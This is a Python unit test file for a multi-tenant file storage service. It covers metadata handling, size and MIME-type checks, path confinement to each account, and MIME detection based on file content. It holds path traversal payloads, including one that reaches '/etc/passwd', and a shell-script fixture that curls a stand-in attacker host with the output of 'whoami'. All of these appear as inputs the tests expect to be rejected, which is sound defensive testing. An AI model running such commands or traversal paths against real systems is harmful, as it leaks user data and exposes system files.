"""Unit tests for file storage service."""

import json
import tempfile
from io import BytesIO
from pathlib import Path

import pytest

from snackbase.domain.services.file_storage_service import (
    FileMetadata,
    FileStorageService,
    detect_mime_type,
)


class TestFileMetadata:
    """Tests for FileMetadata dataclass."""

    def test_to_dict(self):
        """Test converting FileMetadata to dictionary."""
        metadata = FileMetadata(
            filename="test.txt",
            size=1024,
            mime_type="text/plain",
            path="account123/uuid-test.txt",
        )

        result = metadata.to_dict()

        assert result == {
            "filename": "test.txt",
            "size": 1024,
            "mime_type": "text/plain",
            "path": "account123/uuid-test.txt",
        }

    def test_to_json(self):
        """Test converting FileMetadata to JSON string."""
        metadata = FileMetadata(
            filename="test.txt",
            size=1024,
            mime_type="text/plain",
            path="account123/uuid-test.txt",
        )

        result = metadata.to_json()
        parsed = json.loads(result)

        assert parsed["filename"] == "test.txt"
        assert parsed["size"] == 1024
        assert parsed["mime_type"] == "text/plain"
        assert parsed["path"] == "account123/uuid-test.txt"

    def test_from_dict(self):
        """Test creating FileMetadata from dictionary."""
        data = {
            "filename": "test.txt",
            "size": 1024,
            "mime_type": "text/plain",
            "path": "account123/uuid-test.txt",
        }

        metadata = FileMetadata.from_dict(data)

        assert metadata.filename == "test.txt"
        assert metadata.size == 1024
        assert metadata.mime_type == "text/plain"
        assert metadata.path == "account123/uuid-test.txt"

    def test_from_json(self):
        """Test creating FileMetadata from JSON string."""
        json_str = json.dumps({
            "filename": "test.txt",
            "size": 1024,
            "mime_type": "text/plain",
            "path": "account123/uuid-test.txt",
        })

        metadata = FileMetadata.from_json(json_str)

        assert metadata.filename == "test.txt"
        assert metadata.size == 1024
        assert metadata.mime_type == "text/plain"
        assert metadata.path == "account123/uuid-test.txt"


class TestFileStorageService:
    """Tests for FileStorageService."""

    @pytest.fixture
    def temp_storage_path(self):
        """Create a temporary storage directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    @pytest.fixture
    def storage_service(self, temp_storage_path):
        """Create a FileStorageService with temporary storage."""
        return FileStorageService(storage_path=temp_storage_path)

    def test_generate_unique_filename_uses_the_detected_type(self, storage_service):
        """The stored name is a UUID plus the extension of the detected type.

        The request-supplied filename is not consulted at all (M-02): letting it
        choose the extension on disk is what made the MIME allowlist advisory.
        """
        result = storage_service._generate_unique_filename("text/plain")

        assert result.endswith(".txt")
        assert len(result) > 10  # UUID should make it longer

    def test_generate_unique_filename_falls_back_for_unmappable_type(
        self, storage_service
    ):
        """An allowed type the platform cannot map to an extension gets `.bin`."""
        result = storage_service._generate_unique_filename("application/x-unmappable")

        assert result.endswith(".bin")

    def test_validate_file_size_success(self, storage_service):
        """Test file size validation passes for valid size."""
        # Should not raise exception
        storage_service.validate_file_size(1024)  # 1KB

    def test_validate_file_size_exceeds_limit(self, storage_service):
        """Test file size validation fails for oversized file."""
        with pytest.raises(ValueError, match="File size.*exceeds maximum"):
            storage_service.validate_file_size(100 * 1024 * 1024)  # 100MB

    def test_validate_mime_type_success(self, storage_service):
        """Test MIME type validation passes for allowed type."""
        # Should not raise exception
        storage_service.validate_mime_type("image/jpeg")

    def test_validate_mime_type_not_allowed(self, storage_service):
        """Test MIME type validation fails for disallowed type."""
        with pytest.raises(ValueError, match="File type.*is not allowed"):
            storage_service.validate_mime_type("application/x-executable")

    @pytest.mark.asyncio
    async def test_save_file_creates_directory(self, storage_service, temp_storage_path):
        """Test that save_file creates account directory if it doesn't exist."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test content")

        await storage_service.save_file(
            account_id=account_id,
            file_content=file_content,
            filename="test.txt",
            mime_type="text/plain",
            size=12,
        )

        # Check directory was created
        account_dir = Path(temp_storage_path) / account_id
        assert account_dir.exists()
        assert account_dir.is_dir()

    @pytest.mark.asyncio
    async def test_save_file_returns_metadata(self, storage_service):
        """Test that save_file returns correct metadata."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test content")

        metadata = await storage_service.save_file(
            account_id=account_id,
            file_content=file_content,
            filename="test.txt",
            mime_type="text/plain",
            size=12,
        )

        assert metadata.filename == "test.txt"
        assert metadata.size == 12
        assert metadata.mime_type == "text/plain"
        assert metadata.path.startswith(f"{account_id}/")
        assert metadata.path.endswith(".txt")

    @pytest.mark.asyncio
    async def test_save_file_stores_content(self, storage_service, temp_storage_path):
        """Test that save_file actually stores the file content."""
        account_id = "test-account-123"
        content = b"test content"
        file_content = BytesIO(content)

        metadata = await storage_service.save_file(
            account_id=account_id,
            file_content=file_content,
            filename="test.txt",
            mime_type="text/plain",
            size=len(content),
        )

        # Read the saved file
        file_path = Path(temp_storage_path) / metadata.path
        assert file_path.exists()

        with open(file_path, "rb") as f:
            saved_content = f.read()

        assert saved_content == content

    @pytest.mark.asyncio
    async def test_save_file_validates_size(self, storage_service):
        """Test that save_file validates file size."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test")

        with pytest.raises(ValueError, match="File size.*exceeds maximum"):
            await storage_service.save_file(
                account_id=account_id,
                file_content=file_content,
                filename="test.txt",
                mime_type="text/plain",
                size=100 * 1024 * 1024,  # 100MB
            )

    @pytest.mark.asyncio
    async def test_save_file_validates_mime_type(self, storage_service):
        """Test that save_file validates MIME type."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test")

        with pytest.raises(ValueError, match="File type.*is not allowed"):
            await storage_service.save_file(
                account_id=account_id,
                file_content=file_content,
                filename="test.exe",
                mime_type="application/x-executable",
                size=4,
            )

    @pytest.mark.asyncio
    async def test_get_file_path_success(self, storage_service, temp_storage_path):
        """Test getting file path for existing file."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test content")

        # Save a file first
        metadata = await storage_service.save_file(
            account_id=account_id,
            file_content=file_content,
            filename="test.txt",
            mime_type="text/plain",
            size=12,
        )

        # Get the file path
        file_path = storage_service.get_file_path(account_id, metadata.path)

        assert file_path.exists()
        assert file_path.is_file()

    def test_get_file_path_wrong_account(self, storage_service):
        """Test that get_file_path rejects files from different account."""
        with pytest.raises(ValueError, match="Invalid file path"):
            storage_service.get_file_path("account1", "account2/file.txt")

    def test_get_file_path_not_found(self, storage_service):
        """Test that get_file_path raises FileNotFoundError for missing file."""
        with pytest.raises(FileNotFoundError):
            storage_service.get_file_path("test-account", "test-account/nonexistent.txt")

    @pytest.mark.parametrize(
        "payload",
        [
            # Escaping the storage root entirely.
            "test-account/../../../etc/passwd",
            # Sideways into a sibling tenant's directory. This stays *inside*
            # the storage root, so root confinement alone would let it through
            # (C-01); the guard confines to the caller's own account directory.
            "test-account/../other-account/secret.txt",
        ],
    )
    def test_get_file_path_traversal_attack(self, storage_service, temp_storage_path, payload):
        """Test that get_file_path prevents path traversal attacks."""
        sibling = Path(temp_storage_path) / "other-account"
        sibling.mkdir(parents=True, exist_ok=True)
        (sibling / "secret.txt").write_text("sibling tenant data")

        with pytest.raises(ValueError, match="Invalid file path"):
            storage_service.get_file_path("test-account", payload)

    @pytest.mark.asyncio
    async def test_delete_file_success(self, storage_service, temp_storage_path):
        """Test deleting a file."""
        account_id = "test-account-123"
        file_content = BytesIO(b"test content")

        # Save a file first
        metadata = await storage_service.save_file(
            account_id=account_id,
            file_content=file_content,
            filename="test.txt",
            mime_type="text/plain",
            size=12,
        )

        # Verify file exists
        file_path = Path(temp_storage_path) / metadata.path
        assert file_path.exists()

        # Delete the file
        storage_service.delete_file(account_id, metadata.path)

        # Verify file is deleted
        assert not file_path.exists()

    def test_delete_file_not_found(self, storage_service):
        """Test that delete_file raises FileNotFoundError for missing file."""
        with pytest.raises(FileNotFoundError):
            storage_service.delete_file("test-account", "test-account/nonexistent.txt")

    def test_delete_file_wrong_account(self, storage_service):
        """Test that delete_file rejects files from different account."""
        with pytest.raises(ValueError, match="Invalid file path"):
            storage_service.delete_file("account1", "account2/file.txt")


class TestDetectMimeType:
    """Tests for content-based MIME detection (M-02).

    The client writes `Content-Type` into the multipart part header, so an
    allowlist checked against it is advisory. These cover what the bytes are
    allowed to say about themselves.
    """

    # A real 1x1 PNG.
    PNG_BYTES = bytes.fromhex(
        "89504e470d0a1a0a"
        "0000000d49484452000000010000000108060000001f15c489"
        "0000000a49444154789c63000100000500010d0a2db4"
        "0000000049454e44ae426082"
    )
    PDF_BYTES = b"%PDF-1.4\n1 0 obj\n<< >>\nendobj\ntrailer\n<< >>\n%%EOF\n"
    SHELL_SCRIPT_BYTES = b"#!/bin/sh\ncurl https://attacker.example.com/$(whoami)\n"
    ELF_BYTES = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56

    def test_signature_wins_over_the_declared_type(self):
        """A real PNG is a PNG whatever the part header claims."""
        assert detect_mime_type(self.PNG_BYTES, "text/plain") == "image/png"

    def test_genuine_pdf_is_detected(self):
        assert detect_mime_type(self.PDF_BYTES, "application/pdf") == "application/pdf"

    def test_signatureless_text_may_claim_a_text_type(self):
        assert detect_mime_type(b"just some text\n", "text/plain") == "text/plain"

    def test_script_claiming_an_image_is_refused(self):
        """A shell script has no signature, and `image/png` requires one."""
        with pytest.raises(ValueError, match="does not match the declared type"):
            detect_mime_type(self.SHELL_SCRIPT_BYTES, "image/png")

    def test_executable_claiming_an_image_is_refused(self):
        """An ELF binary is a recognisable format, and not an allowed one."""
        with pytest.raises(ValueError, match="not an allowed file type"):
            detect_mime_type(self.ELF_BYTES, "image/png")

    def test_binary_content_cannot_claim_a_text_type(self):
        """`text/plain` needs no signature, but it does need to be text."""
        with pytest.raises(ValueError, match="does not match the declared type"):
            detect_mime_type(b"\x00\x01\x02\xff\xfe", "text/plain")

    def test_disallowed_declared_type_reports_as_disallowed(self):
        """An honestly-declared bad type keeps its own error, not a mismatch."""
        with pytest.raises(ValueError, match="is not allowed"):
            detect_mime_type(self.SHELL_SCRIPT_BYTES, "application/x-sh")
